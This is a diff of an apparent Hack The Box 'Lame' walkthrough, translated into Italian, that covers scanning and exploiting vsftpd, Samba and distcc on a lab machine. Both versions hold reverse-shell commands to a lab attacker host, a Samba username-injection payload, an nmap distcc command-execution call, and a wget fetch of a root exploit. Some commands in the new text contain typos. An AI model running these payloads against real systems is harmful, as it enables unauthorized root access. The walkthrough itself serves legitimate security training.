@@ -2,7 +2,7 @@
 
 ## Reconnaissance
 
-Per prima cosa eseguiamo una scansione iniziale con nmap per capire quali sono le porte aperte e quali sono i servizi che girano su di esse.
+Per prima cosa eseguo una scansione iniziale con nmap per conoscere le porte aperte e i servizi che girano su di esse.
 
 ```text
 sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.3
@@ -27,7 +27,7 @@ Le porte aperte sono le seguenti:
   <img src="/immagini/immagini-macchine-linux/lame-2.png" />
 </p>
 
-Prima di iniziare a lavorare su queste porte, lanciamo una scansione nmap più completa in background.
+Prima di iniziare a lavorare su queste porte, lancio una scansione nmap più completa in background.
 
 ```text
 sudo nmap -sC -sV -O -p- -oA /usr/share/nmap/full 10.10.10.3
@@ -39,29 +39,19 @@ Di seguito il risultato della seconda scansione:
   <img src="/immagini/immagini-macchine-linux/lame-3.png" />
 </p>
 
-Possiamo notare la presenza di una nuova porta che non veniva mostrata precedentemente.
+E' possibile notare la presenza di una nuova porta che non veniva mostrata nella scansione precedente.
 
 * **Porta 3632**: distributed compiler daemon distcc versione 1.
 
-Prima di completare questa fase, eseguiamo un'ultima scansione UDP.
-
-```text
-sudo nmap -sU -O -p- -oA /usr/share/nmap/udp 10.10.10.3
-```
-
-Dal risultato possiamo notare che tutte le porte sono filtrate o chiuse.
-
-![](https://miro.medium.com/max/635/1*-SGvjjvid3UP15zWl8HouA.png)
-
-Usciamo da questa fase con quattro differenti punti di ingresso per questa macchina.
+Esco da questa fase con quattro differenti punti di ingresso da testare.
 
 ## Enumeration
 
-In questa fase cerchiamo di capire se qualcuno di questi servizi servizi è configurato in modo errato o se presenta vulnerabilità note.
+In questa fase cerco di capire se qualcuno di questi servizi servizi è configurato in modo errato o se presenta vulnerabilità note.
 
 ### 1) Porta 21 vsftpd v2.3.4
 
-Una semplice ricerca su google ci mostra che questa versione è vulnerabile all'esecuzione di un comando backdoor che viene attivato inserendo una stringa che contiene i caratteri “:\)” come nome utente.
+Una semplice ricerca su google mi mostra che questa versione è vulnerabile all'esecuzione di un comando backdoor che viene attivato inserendo una stringa come username che contiene i caratteri “:\)”.
 Quando la backdoor viene attivata, la macchina di destinazione apre una shell sulla porta 6200.
 
 E' possibile controllare l'effettiva vulnerabilità mediante uno script nmap.
@@ -78,23 +68,27 @@ nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
   <img src="/immagini/immagini-macchine-linux/lame-5.png" />
 </p>
 
-Dall'output dello script capiamo che non è possibile sfruttare questa vulnerabilità.
+Dall'output dello script capisco che non è possibile sfruttare questa vulnerabilità.
 
 ### 2) Porta 22 OpenSSH v4.7p1
 
-Anche qui effettuando una rapida ricerca su google mi sono imbattuto in questo progetto su git: [OpenSSH 4.7p1 CVE-2008-5161 Exploit](https://github.com/pankajjarial360/OpenSSH_4.7p1).
+Effettuando una rapida ricercaho trovato questo progetto: [OpenSSH 4.7p1 CVE-2008-5161 Exploit](https://github.com/pankajjarial360/OpenSSH_4.7p1).
 
-Lo script openssh_4.7p1.py controlla la versione del servizio SSH per confermare che sia in esecuzione OpenSSH versione 4.7p1. Se la versione è corretta, lo script imposta i parametri necessari per un attacco brute-force utilizzando un elenco di nomi utente e password presi da una specifica wordlist. Lo script quindi avvia l'exploit e attende che venga completato.
+Lo script openssh_4.7p1.py controlla la versione del servizio SSH per confermare che sia in esecuzione OpenSSH versione 4.7p1. Successivamente, imposta i parametri necessari per un attacco brute-force utilizzando un elenco di nomi utente e password presi da una specifica wordlist.
 
-Una volta completato l'exploit, lo script recupera tutte le sessioni attive che sono state create e permette di interagire con la sessione.
+Una volta avviato e completato l'exploit, lo script recupera tutte le sessioni attive che sono state create e permette di interagire con esse.
 
-Lanciamo lo script in background e proseguiamo con l'analisi dei restanti punti di ingresso.
+Lancio lo script in background e proseguo con l'analisi dei restanti punti di ingresso.
 
 ```text
 python openssh_4.7p1.py
 ```
 
-Questa strada richiedeva troppo tempo.
+<p align="center">
+  <img src="/immagini/immagini-macchine-linux/lame-8.png" />
+</p>
+
+Questa strada richiedeva troppo tempo e per questo motivo l'esecuzione dello script è stata interrotta.
 
 ### 3) Porte 139 e 445 Samba v3.0.20-Debian
 
@@ -105,9 +99,9 @@ smbclient -L 10.10.10.3
 ```
 * **-L**: lista dei serzi disponibili sul server
 
-Possiamo notare che il client dal quale è stato eseguito il comando è configurato in maniera tale da non connettersi alle versioni SMB precedenti (per motivi di sicurezza).
+Noto che la mia macchina è configurata in maniera tale da non connettersi alle versioni SMB precedenti (per motivi di sicurezza).
 
-Per ovviare a questo problema modifichiamo il comando nel modo seguente:
+Per ovviare a questo problema modifico il comando nel modo seguente:
 
 ```text
 smbclient -L 10.10.10.3 --option='client min protocol=NT1'
@@ -116,9 +110,9 @@ smbclient -L 10.10.10.3 --option='client min protocol=NT1'
   <img src="/immagini/immagini-macchine-linux/lame-6.png" />
 </p>
 
-E' disponibile il login anonimo.
+**E' disponibile il login anonimo!**
 
-Ora scopriamo i permessi sui drive condivisi.
+Ora cerco di capire quali sono i permessi sui file condivisi.
 
 ```text
 smbmap -H 10.10.10.3
@@ -126,165 +120,141 @@ smbmap -H 10.10.10.3
 
 * **-H**: IP dell'host
 
-Abbiamo accesso di tipo READ/WRITE sulla cartella tmp.
+Scopro di avere accesso di tipo READ/WRITE sulla cartella tmp.
 
 <p align="center">
   <img src="/immagini/immagini-macchine-linux/lame-7.png" />
 </p>
 
-Eseguendo delle ricerche è stato possibile scoprire che questa versione è [vulnerabile](https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-41384/Samba-Samba-3.0.20.html) (e non poco). We’re looking for a code execution vulnerability that would ideally give us Admin access. After going through all the code execution vulnerabilities, the simplest one that won’t require me to use Metasploit is [CVE-2007–2447](https://www.cvedetails.com/cve/CVE-2007-2447/).
+Effettuando una ricerca veloce noto che questa versione del servizio è [vulnerabile](https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-41384/Samba-Samba-3.0.20.html).
 
-The issue seems to be with the username field. If we send shell metacharacters into the username we exploit a vulnerability which allows us to execute arbitrary commands. Although the [exploit](https://www.exploit-db.com/exploits/16320) available on exploitdb uses Metasploit, reading through the code tells us that all the script is doing is running the following command, where “payload.encoded” would be a reverse shell sent back to our attack machine.
+Cerco di sfruttare la vulnerabilità [CVE-2007–2447](https://www.cvedetails.com/cve/CVE-2007-2447/) che si basa su un problema legato all'invio di specifici metacaratteri.
 
 ```text
 "/=`nohup " + payload.encoded + "`"
 ```
 
-Before we exploit this, let’s look at our last point of entry.
+Prima di sfruttare la vulnerabilità, analizzo l'ultimo punto di ingresso rimasto.
 
 ### 3) Port 3632 distcc v1
 
-Googling “distcc v1” reveals that this service is vulnerable to a remote code execution and there’s an nmap script that can verify that.
+Da una ricerca capisco che il servizio è vulnerabile all'esecuzione di codice da remoto.
+
+Esiste uno script nmap che permette di verificare la presenza di questa vulnerabilità.
 
 ```text
 nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
 ```
 
-The result shows us that it’s vulnerable!
+**E' vulnerabile!**
 
-![](https://miro.medium.com/max/725/1*kPeaLZx-dDl2QuHjHg2GtA.png)
+<p align="center">
+  <img src="/immagini/immagini-macchine-linux/lame-9.png" />
+</p>
 
-So we have two potential ways to exploit this machine.
+Quindi ho a disposizione due strade per cercare di bucare questa macchina.
 
-## Exploitation \#1: Samba <a id="fcd7"></a>
+## Exploitation
 
-Add a listener on attack machine.
+### 1) Samba
+
+Mi metto in ascolto sulla porta 8080.
+
+```text
+nc -nlvp 8080
+```
+
+Eseguo il login sul client smb.
+
+```text
+smbclient //10.10.10.3/tmp --option='client min protocol=NT1'
+```
+
+Inserisco la sequenza di metacaratteri menzionata in precedenza.
+
+```text
+logon "/=`nohup nc -nv 10.10.14.5 8080 -e /bin/sh`"
+```
+
+**Ho ottenuto una shell dalla macchina lame con privilegi root!**
+
+<p align="center">
+  <img src="/immagini/immagini-macchine-linux/lame-10.png" />
+</p>
+
+### 2) Distcc
+
+Utilizzo uno script nmap per sfruttare la vulnerabilità citata precedentemente.
+
+Mi metto in ascolto sulla porta 4444.
 
 ```text
 nc -nlvp 4444
 ```
 
-Log into the smb client.
+Successivamente, utilizzo lo script nmap per dare vita a una reverse shell.
 
 ```text
-smbclient //10.10.10.3/tmp
+nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.5 4444 -e /bin/bash'"
 ```
 
-As mentioned in the previous section, we’ll send shell metacharacters into the username with a reverse shell payload.
+Questa volta non abbiamo una shell con privilegi root.
 
-```text
-logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
-```
+<p align="center">
+  <img src="/immagini/immagini-macchine-linux/lame-10.png" />
+</p>
 
-The shell connects back to our attack machine and we have root! In this scenario, we didn’t need to escalate privileges.
-
-![](https://miro.medium.com/max/719/1*DdvA5iSrtgHA7NTjHO527A.png)
-
-Grab the user flag.
-
-![](https://miro.medium.com/max/519/1*W-JJhSQNW8QMzh2M1XoUbA.png)
-
-Grab the root flag.
-
-![](https://miro.medium.com/max/572/1*EFS66PmJse9YpGTSus10wA.png)
-
-## Exploitation \#2: Distcc <a id="714d"></a>
-
-In the previous section, we saw that this service is vulnerable to CVE 2004–2687 and there’s an nmap script that can be used to exploit this vulnerability and run arbitrary commands on the target machine.
-
-First, start a listener on the attack machine.
-
-```text
-nc -nlvp 4444
-```
-
-Then, use the nmap script to send a reverse shell back to the attack machine.
-
-```text
-nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.6 4444 -e /bin/bash'"
-```
-
-![](https://miro.medium.com/max/722/1*XGycXseoW7pDQLJnfN6PwA.png)
-
-The shell connects back to our attack machine and we have a non privileged shell!
-
-![](https://miro.medium.com/max/692/1*a6yMG05f7RV-LU2091HSBQ.png)
-
-We’ll need to escalate privileges. Google the OS version — Linux 2.6.24 to see if it is vulnerable to any exploits. I tried [CVE 2016–5195](https://www.exploit-db.com/exploits/40839) and [CVE 2008–0600](https://www.exploit-db.com/exploits/5093), but they didn’t work.
-
-Let’s try [CVE 2009–1185](https://www.exploit-db.com/exploits/8572). Download the exploit from searchsploit.
+Per ottenere i privilegi root provo con la vulnerabilità [CVE 2009–1185](https://www.exploit-db.com/exploits/8572).
 
 ```text
 searchsploit -m 8572.c
 ```
 
-Start up a server on your attack machine.
+Avvio un server sulla mia macchina.
 
 ```text
-python -m SimpleHTTPServer 9005
+python -m SimpleHTTPServer 9000
 ```
 
-In the target machine download the exploit file.
+Trasferisco il file alla macchina lame.
 
 ```text
-wget http://10.10.14.6:5555/8572.c
+wget http://10.10.14.5:9000/8572.c
 ```
 
-Compile the exploit.
+Compilo l'exploit.
 
 ```text
 gcc 8572.c -o 8572
 ```
 
-To run it, let’s look at the usage instructions.
+Per eseguirlo mi servono devo:
+* Trovare il PID del servizio
+* Creare un file nella cartella /tmp e aggiungere una reverse shell in esso
 
-![](https://miro.medium.com/max/677/1*I7M6fBne0AtCu96yQhG2eQ.png)
-
-We need to do two things:
-
-* Figure out the PID of the udevd netlink socket
-* Create a run file in /tmp and add a reverse shell to it. Since any payload in that file will run as root, we’ll get a privileged reverse shell.
-
-To get the PID of the udevd process, run the following command.
+Per ottenre il PID eseguo il seguente comando:
 
 ```text
 ps -aux | grep devd
 ```
+Creo il file **run** in /tmp e aggiungo una reverse shell all'interno.
 
-![](https://miro.medium.com/max/784/1*4zJv2v2CWRwcyAuQ9PNjIA.png)
+```text
+cd /tempo
+echo '#/bin/bash' > run
+echo 'nc -nv 10.10.14.5' 4445 -e /bin/bash' >> run
+```
 
-Similarly, you can get it through this file as mentioned in the instructions.
-
-![](https://miro.medium.com/max/623/1*JIArJfTIn6IPx7J8jV6NUw.png)
-
-Next, create a **run** file in /tmp and add a reverse shell to it.
-
-![](https://miro.medium.com/max/471/1*SFdTIwhLSQtQX_jdSN7B_Q.png)
-
-Confirm that the reverse shell was added correctly.
-
-![](https://miro.medium.com/max/522/1*-77rPpCHax0hvwOo42FSWA.png)
-
-Set up a listener on your attack machine to receive the reverse shell.
+Mi metto in ascolto sulla porta 4445.
 
 ```text
 nc -nlvp 4445
 ```
 
-Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.
+Eseguo l'exploit.
 
 ```text
 ./8572 2661
 ```
 
-We have root!
-
-![](https://miro.medium.com/max/610/1*cW-sxid7icV3oHaN-5w3tQ.png)
-
-We solved this machine in two different ways!
-
-## Lessons Learned <a id="31ac"></a>
-
-1. Always run a full port scan! We wouldn’t have discovered the vulnerable distributed compiler daemon distcc running on port 3632 if we only ran the initial scan. This gave us an initial foothold on the machine where we were eventually able to escalate privileges to root.
-2. Always update and patch your software! In both exploitation methods, we leveraged publicly disclosed vulnerabilities that have security updates and patches available.
-3. Samba ports should not be exposed! Use a firewall to deny access to these services from outside your network. Moreover, restrict access to your server to valid users only and disable WRITE access if not necessary.
+**Ed ecco l'utenza root!**
